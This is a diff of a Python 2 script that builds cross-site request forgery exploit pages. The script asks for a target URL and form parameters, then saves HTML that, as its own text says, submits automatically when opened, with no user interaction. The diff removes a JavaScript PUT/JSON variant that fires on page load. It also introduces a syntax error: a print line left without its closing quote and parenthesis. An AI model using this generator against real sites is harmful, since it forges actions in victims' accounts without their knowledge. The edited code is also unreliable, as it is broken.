@@ -59,24 +59,15 @@ print(" once the exploit is created, save it as .html and run it.We added ")
 print(" javascript in the end of the exploit so whenever the .html opens  ")
 print(" the exploit will run automatically(Without user interaction).")
 print("")
-color = str(raw_input("[+] Select text color:\n\n1.White\n2.Green\n\nEnter 1 or 2: "))
-if color == "2":
-    green = os.system('color a')
-elif color == "1":
-    white = os.system('color F')
-else:
-    print "select 'white' or 'green' only!"
-
-print("")
 print ("[+] Select method:") #Printing options for HTTP methods
 print ("")
 print ("1.POST")
 print ("2.GET")
-print ("3.PUT(JSON)")
+print ("other options will be added soon.
 print ("")
-method = str(raw_input("[+] Select 1 , 2 or 3: "))
+method = str(raw_input("[+] Select 1 or 2 : "))
 print ("")
-options1 = "1","2","3"
+options1 = "1","2"
 if method == "1": #POST Method
 	print ("")
 	action = str(raw_input("[+] Enter 'target' URL: "))
@@ -161,47 +152,6 @@ if method == "2": #GET Method
 	file.close()
 	print("Your exploit is saved as %s")%filename
 	print("")
-if method == "3": #PUT(JSON)
-	actionurl = str(raw_input("[+] Enter full target URL(e.g, http://www.site.com/file.do): "))
-	exploittitle = "\n[+] Exploit:"
-	formstart = "\t<script>\n\tfunction put() {\n\tvar x = new XMLHttpRequest();\n\tx.open(\"PUT\",\"" + actionurl + "\",true);\n\tx.setRequestHeader(\"Content-Type\", \"application/json\");"
-	formend = "\t}\n\t</script>\n\t<body onload=\"put()\">"
-
-	num = raw_input("Enter how many parameters you want to enter? :")
-	if num.isdigit():
-		num_array = list()
-		name_array = list()
-		print("")
-		print 'Enter parameter "Name" and "Value": '
-		for i in range(int(num)): #FOR loop for asking Parameter Name and Value.
-			print("")
-			n = raw_input("Name : ")
-			n2 = n
-			n1 = raw_input("Value: ")
-			n3 = n1
-			num_array.append(str(n2))
-			name_array.append(str(n3))
-		finalstring = dict(zip(num_array, name_array))
-		print exploittitle
-		print formstart
-		print("\tx.send(JSON.stringify(" + str(finalstring) +"));")
-		print formend
-
-		print("Enter your Filename,\nNote: The exploit will be saved as 'filename'.html \n")
-		extension = ".html"
-		name = str(raw_input("Filename: "))
-		filename = name+extension
-		file = open(filename, "w")
-
-		file.write(formstart)
-		file.write("\n")
-		file.write("\tx.send(JSON.stringify(%s));" % (finalstring))
-		file.write(formend)
-		file.close()
-		print("Your exploit is saved as %s")%filename
-		print("")
-	else:
-		print("Invalid value!")
 
 print ("")
 exittheprogram = raw_input("Press Enter to exit.")
